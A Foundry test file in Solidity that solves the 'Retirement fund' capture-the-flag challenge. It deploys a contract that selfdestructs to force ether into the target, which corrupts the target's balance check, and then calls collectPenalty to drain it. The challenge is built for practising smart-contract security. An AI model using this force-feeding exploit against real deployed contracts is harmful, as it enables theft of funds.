// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/3-Retirement-fund.sol";

contract Bomb {
    constructor() payable { }

    function kboom(address victim) external {
        selfdestruct(payable(victim));
    }
}

contract Challenge3Test is Test {
    RetirementFundChallenge target;
    address player = vm.addr(1);

    function setUp() public {
        target = new RetirementFundChallenge{value: 1 ether}(player);
        vm.label(address(target), "Challenge");
        vm.label(player, "Player");
        vm.deal(player, 1 ether);
    }

    function testExample() public {
        vm.startPrank(player);
        
        // tu codigo aca
        Bomb b = new Bomb{value: 1}();
        b.kboom(address(target));
        
        target.collectPenalty();
        
        
        assertTrue(target.isComplete());
    }
}
